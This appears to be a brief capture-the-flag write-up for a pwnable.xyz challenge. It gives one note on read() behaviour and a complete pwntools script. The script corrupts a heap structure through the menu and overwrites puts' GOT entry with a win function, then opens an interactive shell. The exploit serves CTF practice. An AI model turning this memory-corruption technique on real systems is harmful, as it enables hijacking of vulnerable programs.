### 知识点

- read的表现：当buffer地址不可写时，中止读取操作，返回-1





### 脚本

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
puts_got = e.got['puts']
win_addr = e.symbols['win']

p = remote('svc.pwnable.xyz', 30038)
# p = process('./challenge')

def newChild():
    p.sendafter(b'> ', b'2')
    p.sendafter(b'Age: ', b'18')
    p.sendafter(b'Name: ', b'a')
    p.sendafter(b'Job: ', b'a')

def transform(who, name, job):
    p.sendafter(b'> ', b'5')
    p.sendafter(b'Person: ', str.encode(str(who)))
    p.sendafter(b'Name: ', name)
    p.sendafter(b'Job: ', job)

def ageUp():
    p.sendafter(b'> ', b'3')
    p.sendafter(b'Person: ', b'0')

newChild()
newChild()
transform(0, b'a', b'a')

for i in range(0x30):
    ageUp()

transform(0, b'a', b'10')
transform(0, b'a', p64(puts_got))
transform(1, p64(win_addr), b'a')

# gdb.attach(p)
p.sendafter(b'> ', b'4')
p.interactive()

```



